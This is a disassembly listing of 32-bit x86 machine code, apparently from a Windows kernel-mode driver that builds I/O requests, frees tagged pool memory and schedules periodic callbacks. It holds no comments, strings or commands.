  401d7e:	5b                   	pop    %ebx
  401d7f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401d82:	33 cd                	xor    %ebp,%ecx
  401d84:	e8 ed 4e 00 00       	call   0x406c76
  401d89:	8b e5                	mov    %ebp,%esp
  401d8b:	5d                   	pop    %ebp
  401d8c:	c2 0c 00             	ret    $0xc
  401d8f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401d92:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
  401d97:	5e                   	pop    %esi
  401d98:	33 cd                	xor    %ebp,%ecx
  401d9a:	5b                   	pop    %ebx
  401d9b:	e8 d6 4e 00 00       	call   0x406c76
  401da0:	8b e5                	mov    %ebp,%esp
  401da2:	5d                   	pop    %ebp
  401da3:	c2 0c 00             	ret    $0xc
  401da6:	cc                   	int3
  401da7:	cc                   	int3
  401da8:	cc                   	int3
  401da9:	cc                   	int3
  401daa:	cc                   	int3
  401dab:	cc                   	int3
  401dac:	cc                   	int3
  401dad:	cc                   	int3
  401dae:	cc                   	int3
  401daf:	cc                   	int3
  401db0:	55                   	push   %ebp
  401db1:	8b ec                	mov    %esp,%ebp
  401db3:	56                   	push   %esi
  401db4:	8b 75 0c             	mov    0xc(%ebp),%esi
  401db7:	6a 00                	push   $0x0
  401db9:	6a 00                	push   $0x0
  401dbb:	8b 4e 28             	mov    0x28(%esi),%ecx
  401dbe:	8b 46 18             	mov    0x18(%esi),%eax
  401dc1:	89 01                	mov    %eax,(%ecx)
  401dc3:	8b 4e 28             	mov    0x28(%esi),%ecx
  401dc6:	8b 46 1c             	mov    0x1c(%esi),%eax
  401dc9:	89 41 04             	mov    %eax,0x4(%ecx)
  401dcc:	8b 46 2c             	mov    0x2c(%esi),%eax
  401dcf:	50                   	push   %eax
  401dd0:	ff 15 98 71 40 00    	call   *0x407198
  401dd6:	56                   	push   %esi
  401dd7:	ff 15 80 70 40 00    	call   *0x407080
  401ddd:	b8 16 00 00 c0       	mov    $0xc0000016,%eax
  401de2:	5e                   	pop    %esi
  401de3:	5d                   	pop    %ebp
  401de4:	c2 0c 00             	ret    $0xc
  401de7:	cc                   	int3
  401de8:	cc                   	int3
  401de9:	cc                   	int3
  401dea:	cc                   	int3
  401deb:	cc                   	int3
  401dec:	cc                   	int3
  401ded:	cc                   	int3
  401dee:	cc                   	int3
  401def:	cc                   	int3
  401df0:	55                   	push   %ebp
  401df1:	8b ec                	mov    %esp,%ebp
  401df3:	83 ec 6c             	sub    $0x6c,%esp
  401df6:	a1 a4 a7 40 00       	mov    0x40a7a4,%eax
  401dfb:	33 c5                	xor    %ebp,%eax
  401dfd:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401e00:	53                   	push   %ebx
  401e01:	56                   	push   %esi
  401e02:	8b 75 08             	mov    0x8(%ebp),%esi
  401e05:	33 db                	xor    %ebx,%ebx
  401e07:	57                   	push   %edi
  401e08:	56                   	push   %esi
  401e09:	89 5d c4             	mov    %ebx,-0x3c(%ebp)
  401e0c:	89 5d c8             	mov    %ebx,-0x38(%ebp)
  401e0f:	ff 15 84 70 40 00    	call   *0x407084
  401e15:	6a 01                	push   $0x1
  401e17:	89 45 cc             	mov    %eax,-0x34(%ebp)
  401e1a:	0f b6 48 30          	movzbl 0x30(%eax),%ecx
  401e1e:	51                   	push   %ecx
  401e1f:	ff 15 8c 71 40 00    	call   *0x40718c
  401e25:	8b f8                	mov    %eax,%edi
  401e27:	85 ff                	test   %edi,%edi
  401e29:	75 0d                	jne    0x401e38
  401e2b:	8b ce                	mov    %esi,%ecx
  401e2d:	ff 15 8c 70 40 00    	call   *0x40708c
  401e33:	e9 9c 00 00 00       	jmp    0x401ed4
  401e38:	6a 00                	push   $0x0
  401e3a:	6a 01                	push   $0x1
  401e3c:	8d 45 ac             	lea    -0x54(%ebp),%eax
  401e3f:	50                   	push   %eax
  401e40:	ff 15 9c 71 40 00    	call   *0x40719c
  401e46:	6a 28                	push   $0x28
  401e48:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  401e4b:	6a 00                	push   $0x0
  401e4d:	50                   	push   %eax
  401e4e:	e8 7d 4a 00 00       	call   0x4068d0
  401e53:	c7 45 f4 80 00 00 00 	movl   $0x80,-0xc(%ebp)
  401e5a:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  401e5d:	89 47 0c             	mov    %eax,0xc(%edi)
  401e60:	83 c4 0c             	add    $0xc,%esp
  401e63:	8d 45 ac             	lea    -0x54(%ebp),%eax
  401e66:	89 77 64             	mov    %esi,0x64(%edi)
  401e69:	89 47 2c             	mov    %eax,0x2c(%edi)
  401e6c:	8d 45 94             	lea    -0x6c(%ebp),%eax
  401e6f:	89 47 28             	mov    %eax,0x28(%edi)
  401e72:	ff 15 a0 71 40 00    	call   *0x4071a0
  401e78:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  401e7b:	8d 55 ac             	lea    -0x54(%ebp),%edx
  401e7e:	89 47 50             	mov    %eax,0x50(%edi)
  401e81:	8b 47 60             	mov    0x60(%edi),%eax
  401e84:	88 5f 20             	mov    %bl,0x20(%edi)
  401e87:	c6 40 dc 06          	movb   $0x6,-0x24(%eax)
  401e8b:	89 48 f0             	mov    %ecx,-0x10(%eax)
  401e8e:	89 70 f4             	mov    %esi,-0xc(%eax)
  401e91:	c7 40 e0 28 00 00 00 	movl   $0x28,-0x20(%eax)
  401e98:	c7 40 e4 04 00 00 00 	movl   $0x4,-0x1c(%eax)
  401e9f:	89 70 e8             	mov    %esi,-0x18(%eax)
  401ea2:	8b 47 60             	mov    0x60(%edi),%eax
  401ea5:	89 50 fc             	mov    %edx,-0x4(%eax)
  401ea8:	8b d7                	mov    %edi,%edx
  401eaa:	c7 40 f8 b0 1d 40 00 	movl   $0x401db0,-0x8(%eax)
  401eb1:	c6 40 df e0          	movb   $0xe0,-0x21(%eax)
  401eb5:	ff 15 78 70 40 00    	call   *0x407078
  401ebb:	3d 03 01 00 00       	cmp    $0x103,%eax
  401ec0:	75 12                	jne    0x401ed4
  401ec2:	6a 00                	push   $0x0
  401ec4:	6a 01                	push   $0x1
  401ec6:	6a 00                	push   $0x0
  401ec8:	6a 00                	push   $0x0
  401eca:	8d 45 ac             	lea    -0x54(%ebp),%eax
  401ecd:	50                   	push   %eax
  401ece:	ff 15 94 71 40 00    	call   *0x407194
  401ed4:	56                   	push   %esi
  401ed5:	ff 15 84 70 40 00    	call   *0x407084
  401edb:	6a 01                	push   $0x1
  401edd:	89 45 cc             	mov    %eax,-0x34(%ebp)
  401ee0:	0f b6 50 30          	movzbl 0x30(%eax),%edx
  401ee4:	52                   	push   %edx
  401ee5:	ff 15 8c 71 40 00    	call   *0x40718c
  401eeb:	8b f8                	mov    %eax,%edi
  401eed:	85 ff                	test   %edi,%edi
  401eef:	75 20                	jne    0x401f11
  401ef1:	8b ce                	mov    %esi,%ecx
  401ef3:	ff 15 8c 70 40 00    	call   *0x40708c
  401ef9:	5f                   	pop    %edi
  401efa:	5e                   	pop    %esi
  401efb:	b8 9a 00 00 c0       	mov    $0xc000009a,%eax
  401f00:	5b                   	pop    %ebx
  401f01:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401f04:	33 cd                	xor    %ebp,%ecx
  401f06:	e8 6b 4d 00 00       	call   0x406c76
  401f0b:	8b e5                	mov    %ebp,%esp
  401f0d:	5d                   	pop    %ebp
  401f0e:	c2 04 00             	ret    $0x4
  401f11:	6a 00                	push   $0x0
  401f13:	6a 01                	push   $0x1
  401f15:	8d 45 9c             	lea    -0x64(%ebp),%eax
  401f18:	50                   	push   %eax
  401f19:	ff 15 9c 71 40 00    	call   *0x40719c
  401f1f:	c6 45 d3 01          	movb   $0x1,-0x2d(%ebp)
  401f23:	8d 45 d3             	lea    -0x2d(%ebp),%eax
  401f26:	89 47 0c             	mov    %eax,0xc(%edi)
  401f29:	8d 45 9c             	lea    -0x64(%ebp),%eax
  401f2c:	89 47 2c             	mov    %eax,0x2c(%edi)
  401f2f:	8d 45 bc             	lea    -0x44(%ebp),%eax
  401f32:	89 47 28             	mov    %eax,0x28(%edi)
  401f35:	89 77 64             	mov    %esi,0x64(%edi)
  401f38:	ff 15 a0 71 40 00    	call   *0x4071a0
  401f3e:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  401f41:	89 47 50             	mov    %eax,0x50(%edi)
  401f44:	8b 47 60             	mov    0x60(%edi),%eax
  401f47:	88 5f 20             	mov    %bl,0x20(%edi)
  401f4a:	89 48 f0             	mov    %ecx,-0x10(%eax)
  401f4d:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  401f50:	c6 40 dc 06          	movb   $0x6,-0x24(%eax)
  401f54:	89 70 f4             	mov    %esi,-0xc(%eax)
  401f57:	c7 40 e0 01 00 00 00 	movl   $0x1,-0x20(%eax)
  401f5e:	c7 40 e4 0d 00 00 00 	movl   $0xd,-0x1c(%eax)
  401f65:	89 70 e8             	mov    %esi,-0x18(%eax)
  401f68:	8b 47 60             	mov    0x60(%edi),%eax
  401f6b:	c7 40 f8 b0 1d 40 00 	movl   $0x401db0,-0x8(%eax)
  401f72:	89 48 fc             	mov    %ecx,-0x4(%eax)
  401f75:	c6 40 df e0          	movb   $0xe0,-0x21(%eax)
  401f79:	8b 46 14             	mov    0x14(%esi),%eax
  401f7c:	85 c0                	test   %eax,%eax
  401f7e:	74 28                	je     0x401fa8
  401f80:	8b 48 08             	mov    0x8(%eax),%ecx
  401f83:	85 c9                	test   %ecx,%ecx
  401f85:	74 06                	je     0x401f8d
  401f87:	89 4d c8             	mov    %ecx,-0x38(%ebp)
  401f8a:	89 58 08             	mov    %ebx,0x8(%eax)
  401f8d:	8b 08                	mov    (%eax),%ecx
  401f8f:	85 c9                	test   %ecx,%ecx
  401f91:	74 05                	je     0x401f98
  401f93:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  401f96:	89 18                	mov    %ebx,(%eax)
  401f98:	8b 48 04             	mov    0x4(%eax),%ecx
  401f9b:	85 c9                	test   %ecx,%ecx
  401f9d:	74 09                	je     0x401fa8
  401f9f:	8b d9                	mov    %ecx,%ebx
  401fa1:	c7 40 04 00 00 00 00 	movl   $0x0,0x4(%eax)
  401fa8:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  401fab:	8b d7                	mov    %edi,%edx
  401fad:	ff 15 78 70 40 00    	call   *0x407078
  401fb3:	3d 03 01 00 00       	cmp    $0x103,%eax
  401fb8:	75 12                	jne    0x401fcc
  401fba:	6a 00                	push   $0x0
  401fbc:	6a 01                	push   $0x1
  401fbe:	6a 00                	push   $0x0
  401fc0:	6a 00                	push   $0x0
  401fc2:	8d 45 9c             	lea    -0x64(%ebp),%eax
  401fc5:	50                   	push   %eax
  401fc6:	ff 15 94 71 40 00    	call   *0x407194
  401fcc:	8b 46 14             	mov    0x14(%esi),%eax
  401fcf:	85 c0                	test   %eax,%eax
  401fd1:	74 1a                	je     0x401fed
  401fd3:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  401fd6:	85 c9                	test   %ecx,%ecx
  401fd8:	74 03                	je     0x401fdd
  401fda:	89 48 08             	mov    %ecx,0x8(%eax)
  401fdd:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  401fe0:	85 c9                	test   %ecx,%ecx
  401fe2:	74 02                	je     0x401fe6
  401fe4:	89 08                	mov    %ecx,(%eax)
  401fe6:	85 db                	test   %ebx,%ebx
  401fe8:	74 03                	je     0x401fed
  401fea:	89 58 04             	mov    %ebx,0x4(%eax)
  401fed:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401ff0:	8b 45 bc             	mov    -0x44(%ebp),%eax
  401ff3:	33 cd                	xor    %ebp,%ecx
  401ff5:	5f                   	pop    %edi
  401ff6:	5e                   	pop    %esi
  401ff7:	5b                   	pop    %ebx
  401ff8:	e8 79 4c 00 00       	call   0x406c76
  401ffd:	8b e5                	mov    %ebp,%esp
  401fff:	5d                   	pop    %ebp
  402000:	c2 04 00             	ret    $0x4
  402003:	cc                   	int3
  402004:	cc                   	int3
  402005:	cc                   	int3
  402006:	cc                   	int3
  402007:	cc                   	int3
  402008:	cc                   	int3
  402009:	cc                   	int3
  40200a:	cc                   	int3
  40200b:	cc                   	int3
  40200c:	cc                   	int3
  40200d:	cc                   	int3
  40200e:	cc                   	int3
  40200f:	cc                   	int3
  402010:	55                   	push   %ebp
  402011:	8b ec                	mov    %esp,%ebp
  402013:	81 ec 80 00 00 00    	sub    $0x80,%esp
  402019:	a1 a4 a7 40 00       	mov    0x40a7a4,%eax
  40201e:	33 c5                	xor    %ebp,%eax
  402020:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402023:	8b 55 08             	mov    0x8(%ebp),%edx
  402026:	8d 45 80             	lea    -0x80(%ebp),%eax
  402029:	53                   	push   %ebx
  40202a:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  40202d:	b9 18 00 00 00       	mov    $0x18,%ecx
  402032:	c7 45 cc 00 00 00 00 	movl   $0x0,-0x34(%ebp)
  402039:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  402040:	c6 00 00             	movb   $0x0,(%eax)
  402043:	8d 40 01             	lea    0x1(%eax),%eax
  402046:	83 e9 01             	sub    $0x1,%ecx
  402049:	75 f5                	jne    0x402040
  40204b:	33 c0                	xor    %eax,%eax
  40204d:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  402050:	68 00 01 00 00       	push   $0x100
  402055:	50                   	push   %eax
  402056:	50                   	push   %eax
  402057:	50                   	push   %eax
  402058:	50                   	push   %eax
  402059:	6a 20                	push   $0x20
  40205b:	6a 02                	push   $0x2
  40205d:	6a 03                	push   $0x3
  40205f:	68 80 00 00 00       	push   $0x80
  402064:	50                   	push   %eax
  402065:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  402068:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40206b:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40206e:	89 45 e0             	mov    %eax,-0x20(%ebp)
  402071:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  402074:	89 45 e8             	mov    %eax,-0x18(%ebp)
  402077:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40207a:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40207d:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402080:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402083:	89 45 ac             	mov    %eax,-0x54(%ebp)
  402086:	89 45 b8             	mov    %eax,-0x48(%ebp)
  402089:	89 45 bc             	mov    %eax,-0x44(%ebp)
  40208c:	8d 45 a0             	lea    -0x60(%ebp),%eax
  40208f:	50                   	push   %eax
  402090:	8d 45 a8             	lea    -0x58(%ebp),%eax
  402093:	c7 45 a8 18 00 00 00 	movl   $0x18,-0x58(%ebp)
  40209a:	50                   	push   %eax
  40209b:	68 00 00 00 40       	push   $0x40000000
  4020a0:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4020a3:	c7 45 b4 40 02 00 00 	movl   $0x240,-0x4c(%ebp)
  4020aa:	50                   	push   %eax
  4020ab:	89 55 b0             	mov    %edx,-0x50(%ebp)
  4020ae:	ff 15 7c 70 40 00    	call   *0x40707c
  4020b4:	85 c0                	test   %eax,%eax
  4020b6:	78 22                	js     0x4020da
  4020b8:	6a 04                	push   $0x4
  4020ba:	6a 28                	push   $0x28
  4020bc:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  4020bf:	50                   	push   %eax
  4020c0:	8d 45 a0             	lea    -0x60(%ebp),%eax
  4020c3:	50                   	push   %eax
  4020c4:	ff 75 d0             	push   -0x30(%ebp)
  4020c7:	ff 15 90 70 40 00    	call   *0x407090
  4020cd:	85 c0                	test   %eax,%eax
  4020cf:	79 1c                	jns    0x4020ed
  4020d1:	ff 75 d0             	push   -0x30(%ebp)
  4020d4:	ff 15 a0 70 40 00    	call   *0x4070a0
  4020da:	33 c0                	xor    %eax,%eax
  4020dc:	5b                   	pop    %ebx
  4020dd:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4020e0:	33 cd                	xor    %ebp,%ecx
  4020e2:	e8 8f 4b 00 00       	call   0x406c76
  4020e7:	8b e5                	mov    %ebp,%esp
  4020e9:	5d                   	pop    %ebp
  4020ea:	c2 0c 00             	ret    $0xc
  4020ed:	f6 45 f4 10          	testb  $0x10,-0xc(%ebp)
  4020f1:	75 de                	jne    0x4020d1
  4020f3:	57                   	push   %edi
  4020f4:	8b 7d d0             	mov    -0x30(%ebp),%edi
  4020f7:	85 ff                	test   %edi,%edi
  4020f9:	74 76                	je     0x402171
  4020fb:	56                   	push   %esi
  4020fc:	8b 75 10             	mov    0x10(%ebp),%esi
  4020ff:	8d 45 c8             	lea    -0x38(%ebp),%eax
  402102:	6a 14                	push   $0x14
  402104:	6a 08                	push   $0x8
  402106:	50                   	push   %eax
  402107:	8d 45 98             	lea    -0x68(%ebp),%eax
  40210a:	89 75 c8             	mov    %esi,-0x38(%ebp)
  40210d:	50                   	push   %eax
  40210e:	57                   	push   %edi
  40210f:	c7 45 cc 00 00 00 00 	movl   $0x0,-0x34(%ebp)
  402116:	ff 15 94 70 40 00    	call   *0x407094
  40211c:	85 c0                	test   %eax,%eax
  40211e:	75 3c                	jne    0x40215c
  402120:	50                   	push   %eax
  402121:	89 45 c0             	mov    %eax,-0x40(%ebp)
  402124:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  402127:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40212a:	50                   	push   %eax
  40212b:	56                   	push   %esi
  40212c:	53                   	push   %ebx
  40212d:	8d 45 98             	lea    -0x68(%ebp),%eax
  402130:	50                   	push   %eax
  402131:	6a 00                	push   $0x0
  402133:	6a 00                	push   $0x0
  402135:	6a 00                	push   $0x0
  402137:	57                   	push   %edi
  402138:	ff 15 9c 70 40 00    	call   *0x40709c
  40213e:	57                   	push   %edi
  40213f:	8b f0                	mov    %eax,%esi
  402141:	ff 15 a0 70 40 00    	call   *0x4070a0
  402147:	8b c6                	mov    %esi,%eax
  402149:	5e                   	pop    %esi
  40214a:	5f                   	pop    %edi
  40214b:	5b                   	pop    %ebx
  40214c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40214f:	33 cd                	xor    %ebp,%ecx
  402151:	e8 20 4b 00 00       	call   0x406c76
  402156:	8b e5                	mov    %ebp,%esp
  402158:	5d                   	pop    %ebp
  402159:	c2 0c 00             	ret    $0xc
  40215c:	5e                   	pop    %esi
  40215d:	5f                   	pop    %edi
  40215e:	33 c0                	xor    %eax,%eax
  402160:	5b                   	pop    %ebx
  402161:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402164:	33 cd                	xor    %ebp,%ecx
  402166:	e8 0b 4b 00 00       	call   0x406c76
  40216b:	8b e5                	mov    %ebp,%esp
  40216d:	5d                   	pop    %ebp
  40216e:	c2 0c 00             	ret    $0xc
  402171:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402174:	33 c0                	xor    %eax,%eax
  402176:	5f                   	pop    %edi
  402177:	33 cd                	xor    %ebp,%ecx
  402179:	5b                   	pop    %ebx
  40217a:	e8 f7 4a 00 00       	call   0x406c76
  40217f:	8b e5                	mov    %ebp,%esp
  402181:	5d                   	pop    %ebp
  402182:	c2 0c 00             	ret    $0xc
  402185:	cc                   	int3
  402186:	cc                   	int3
  402187:	cc                   	int3
  402188:	cc                   	int3
  402189:	cc                   	int3
  40218a:	cc                   	int3
  40218b:	cc                   	int3
  40218c:	cc                   	int3
  40218d:	cc                   	int3
  40218e:	cc                   	int3
  40218f:	cc                   	int3
  402190:	55                   	push   %ebp
  402191:	8b ec                	mov    %esp,%ebp
  402193:	56                   	push   %esi
  402194:	8b 75 08             	mov    0x8(%ebp),%esi
  402197:	83 7e 04 00          	cmpl   $0x0,0x4(%esi)
  40219b:	74 2d                	je     0x4021ca
  40219d:	8b 06                	mov    (%esi),%eax
  40219f:	85 c0                	test   %eax,%eax
  4021a1:	74 27                	je     0x4021ca
  4021a3:	3b c6                	cmp    %esi,%eax
  4021a5:	74 23                	je     0x4021ca
  4021a7:	39 70 04             	cmp    %esi,0x4(%eax)
  4021aa:	75 23                	jne    0x4021cf
  4021ac:	8b 08                	mov    (%eax),%ecx
  4021ae:	39 41 04             	cmp    %eax,0x4(%ecx)
  4021b1:	75 1c                	jne    0x4021cf
  4021b3:	68 78 61 64 76       	push   $0x76646178
  4021b8:	89 0e                	mov    %ecx,(%esi)
  4021ba:	50                   	push   %eax
  4021bb:	89 71 04             	mov    %esi,0x4(%ecx)
  4021be:	ff 15 ac 71 40 00    	call   *0x4071ac
  4021c4:	8b 06                	mov    (%esi),%eax
  4021c6:	3b c6                	cmp    %esi,%eax
  4021c8:	75 dd                	jne    0x4021a7
  4021ca:	5e                   	pop    %esi
  4021cb:	5d                   	pop    %ebp
  4021cc:	c2 04 00             	ret    $0x4
  4021cf:	b9 03 00 00 00       	mov    $0x3,%ecx
  4021d4:	cd 29                	int    $0x29
  4021d6:	cc                   	int3
  4021d7:	cc                   	int3
  4021d8:	cc                   	int3
  4021d9:	cc                   	int3
  4021da:	cc                   	int3
  4021db:	cc                   	int3
  4021dc:	cc                   	int3
  4021dd:	cc                   	int3
  4021de:	cc                   	int3
  4021df:	cc                   	int3
  4021e0:	55                   	push   %ebp
  4021e1:	8b ec                	mov    %esp,%ebp
  4021e3:	8b 45 08             	mov    0x8(%ebp),%eax
  4021e6:	85 c0                	test   %eax,%eax
  4021e8:	74 05                	je     0x4021ef
  4021ea:	89 40 04             	mov    %eax,0x4(%eax)
  4021ed:	89 00                	mov    %eax,(%eax)
  4021ef:	5d                   	pop    %ebp
  4021f0:	c2 04 00             	ret    $0x4
  4021f3:	cc                   	int3
  4021f4:	cc                   	int3
  4021f5:	cc                   	int3
  4021f6:	cc                   	int3
  4021f7:	cc                   	int3
  4021f8:	cc                   	int3
  4021f9:	cc                   	int3
  4021fa:	cc                   	int3
  4021fb:	cc                   	int3
  4021fc:	cc                   	int3
  4021fd:	cc                   	int3
  4021fe:	cc                   	int3
  4021ff:	cc                   	int3
  402200:	ff 15 a8 70 40 00    	call   *0x4070a8
  402206:	6a 05                	push   $0x5
  402208:	ff 15 a0 71 40 00    	call   *0x4071a0
  40220e:	50                   	push   %eax
  40220f:	ff 15 b4 70 40 00    	call   *0x4070b4
  402215:	ff 15 a0 71 40 00    	call   *0x4071a0
  40221b:	50                   	push   %eax
  40221c:	e8 5f 0e 00 00       	call   0x403080
  402221:	68 88 13 00 00       	push   $0x1388
  402226:	e8 a5 25 00 00       	call   0x4047d0
  40222b:	e8 50 14 00 00       	call   0x403680
  402230:	6a 01                	push   $0x1
  402232:	6a 0a                	push   $0xa
  402234:	68 90 23 40 00       	push   $0x402390
  402239:	e8 82 13 00 00       	call   0x4035c0
  40223e:	6a 01                	push   $0x1
  402240:	6a 3c                	push   $0x3c
  402242:	68 b0 23 40 00       	push   $0x4023b0
  402247:	e8 74 13 00 00       	call   0x4035c0
  40224c:	6a 01                	push   $0x1
  40224e:	68 10 0e 00 00       	push   $0xe10
  402253:	68 10 23 40 00       	push   $0x402310
  402258:	e8 63 13 00 00       	call   0x4035c0
  40225d:	6a 01                	push   $0x1
  40225f:	68 10 0e 00 00       	push   $0xe10
  402264:	68 00 23 40 00       	push   $0x402300
  402269:	e8 52 13 00 00       	call   0x4035c0
  40226e:	6a 01                	push   $0x1
  402270:	6a 1e                	push   $0x1e
  402272:	68 50 23 40 00       	push   $0x402350
  402277:	e8 44 13 00 00       	call   0x4035c0
  40227c:	6a 00                	push   $0x0
  40227e:	e8 ad f8 ff ff       	call   0x401b30
  402283:	50                   	push   %eax
  402284:	e8 c7 15 00 00       	call   0x403850
  402289:	e8 d2 1d 00 00       	call   0x404060
  40228e:	84 c0                	test   %al,%al
  402290:	75 1c                	jne    0x4022ae
  402292:	80 3d 04 a8 40 00 00 	cmpb   $0x0,0x40a804
  402299:	75 40                	jne    0x4022db
  40229b:	68 e8 03 00 00       	push   $0x3e8
  4022a0:	e8 2b 25 00 00       	call   0x4047d0
  4022a5:	e8 b6 1d 00 00       	call   0x404060
  4022aa:	84 c0                	test   %al,%al
  4022ac:	74 e4                	je     0x402292
  4022ae:	80 3d 04 a8 40 00 00 	cmpb   $0x0,0x40a804
  4022b5:	75 24                	jne    0x4022db
  4022b7:	e8 84 16 00 00       	call   0x403940
  4022bc:	e8 ff 1a 00 00       	call   0x403dc0
  4022c1:	6a 01                	push   $0x1
  4022c3:	e8 68 14 00 00       	call   0x403730
  4022c8:	68 e8 03 00 00       	push   $0x3e8
  4022cd:	e8 fe 24 00 00       	call   0x4047d0
  4022d2:	80 3d 04 a8 40 00 00 	cmpb   $0x0,0x40a804
  4022d9:	74 dc                	je     0x4022b7
  4022db:	ff 15 ac 70 40 00    	call   *0x4070ac
  4022e1:	68 08 a8 40 00       	push   $0x40a808
  4022e6:	e8 45 29 00 00       	call   0x404c30
  4022eb:	6a 00                	push   $0x0
  4022ed:	ff 15 b0 70 40 00    	call   *0x4070b0
  4022f3:	c2 04 00             	ret    $0x4
  4022f6:	cc                   	int3
  4022f7:	cc                   	int3
  4022f8:	cc                   	int3
  4022f9:	cc                   	int3
  4022fa:	cc                   	int3
  4022fb:	cc                   	int3
  4022fc:	cc                   	int3
  4022fd:	cc                   	int3
  4022fe:	cc                   	int3
  4022ff:	cc                   	int3
  402300:	e9 2b 1e 00 00       	jmp    0x404130
  402305:	cc                   	int3
  402306:	cc                   	int3
  402307:	cc                   	int3
  402308:	cc                   	int3
  402309:	cc                   	int3
  40230a:	cc                   	int3
  40230b:	cc                   	int3
  40230c:	cc                   	int3
  40230d:	cc                   	int3
  40230e:	cc                   	int3
  40230f:	cc                   	int3
  402310:	55                   	push   %ebp
  402311:	8b ec                	mov    %esp,%ebp
  402313:	51                   	push   %ecx
  402314:	53                   	push   %ebx
  402315:	8d 45 ff             	lea    -0x1(%ebp),%eax
  402318:	c6 45 ff 00          	movb   $0x0,-0x1(%ebp)
  40231c:	50                   	push   %eax
  40231d:	6a 01                	push   $0x1
  40231f:	6a 00                	push   $0x0
  402321:	e8 0a 15 00 00       	call   0x403830
  402326:	50                   	push   %eax
  402327:	e8 a4 10 00 00       	call   0x4033d0
  40232c:	80 7d ff 00          	cmpb   $0x0,-0x1(%ebp)
  402330:	8a d8                	mov    %al,%bl
  402332:	74 0a                	je     0x40233e
  402334:	68 90 23 40 00       	push   $0x402390
  402339:	e8 52 13 00 00       	call   0x403690
  40233e:	8a c3                	mov    %bl,%al
  402340:	5b                   	pop    %ebx
  402341:	8b e5                	mov    %ebp,%esp
  402343:	5d                   	pop    %ebp
  402344:	c3                   	ret
  402345:	cc                   	int3
  402346:	cc                   	int3
  402347:	cc                   	int3
  402348:	cc                   	int3
  402349:	cc                   	int3
  40234a:	cc                   	int3
  40234b:	cc                   	int3
  40234c:	cc                   	int3
  40234d:	cc                   	int3
  40234e:	cc                   	int3
  40234f:	cc                   	int3
  402350:	a1 20 a8 40 00       	mov    0x40a820,%eax
  402355:	83 f8 ff             	cmp    $0xffffffff,%eax
  402358:	74 24                	je     0x40237e
  40235a:	40                   	inc    %eax
  40235b:	a3 20 a8 40 00       	mov    %eax,0x40a820
  402360:	83 f8 0a             	cmp    $0xa,%eax
  402363:	75 19                	jne    0x40237e
  402365:	68 58 02 00 00       	push   $0x258
  40236a:	68 50 23 40 00       	push   $0x402350
  40236f:	c7 05 20 a8 40 00 ff 	movl   $0xffffffff,0x40a820
  402376:	ff ff ff 
  402379:	e8 62 13 00 00       	call   0x4036e0
  40237e:	e8 ad ee ff ff       	call   0x401230
  402383:	b0 01                	mov    $0x1,%al
  402385:	c3                   	ret
  402386:	cc                   	int3
  402387:	cc                   	int3
  402388:	cc                   	int3
  402389:	cc                   	int3
  40238a:	cc                   	int3
  40238b:	cc                   	int3
  40238c:	cc                   	int3
  40238d:	cc                   	int3
  40238e:	cc                   	int3
  40238f:	cc                   	int3
  402390:	e8 fb 0c 00 00       	call   0x403090
  402395:	84 c0                	test   %al,%al
  402397:	75 0a                	jne    0x4023a3
  402399:	e8 b2 11 00 00       	call   0x403550
  40239e:	e8 bd 0f 00 00       	call   0x403360
  4023a3:	e9 e8 0c 00 00       	jmp    0x403090
  4023a8:	cc                   	int3
  4023a9:	cc                   	int3
  4023aa:	cc                   	int3
  4023ab:	cc                   	int3
  4023ac:	cc                   	int3
  4023ad:	cc                   	int3
  4023ae:	cc                   	int3
  4023af:	cc                   	int3
  4023b0:	e9 5b 20 00 00       	jmp    0x404410
  4023b5:	cc                   	int3
  4023b6:	cc                   	int3
  4023b7:	cc                   	int3
  4023b8:	cc                   	int3
  4023b9:	cc                   	int3
  4023ba:	cc                   	int3
  4023bb:	cc                   	int3
  4023bc:	cc                   	int3
  4023bd:	cc                   	int3
  4023be:	cc                   	int3
  4023bf:	cc                   	int3
  4023c0:	55                   	push   %ebp
  4023c1:	8b ec                	mov    %esp,%ebp
  4023c3:	e8 58 f5 ff ff       	call   0x401920
  4023c8:	e8 d3 f5 ff ff       	call   0x4019a0
  4023cd:	6a 08                	push   $0x8
  4023cf:	e8 9c f7 ff ff       	call   0x401b70
  4023d4:	50                   	push   %eax
  4023d5:	6a 07                	push   $0x7
  4023d7:	e8 94 f7 ff ff       	call   0x401b70
  4023dc:	50                   	push   %eax
  4023dd:	e8 1e f5 ff ff       	call   0x401900
  4023e2:	68 80 24 40 00       	push   $0x402480
  4023e7:	ff 75 0c             	push   0xc(%ebp)
  4023ea:	ff 75 08             	push   0x8(%ebp)
  4023ed:	e8 0e f0 ff ff       	call   0x401400
  4023f2:	84 c0                	test   %al,%al
  4023f4:	74 50                	je     0x402446
  4023f6:	e8 25 3a 00 00       	call   0x405e20
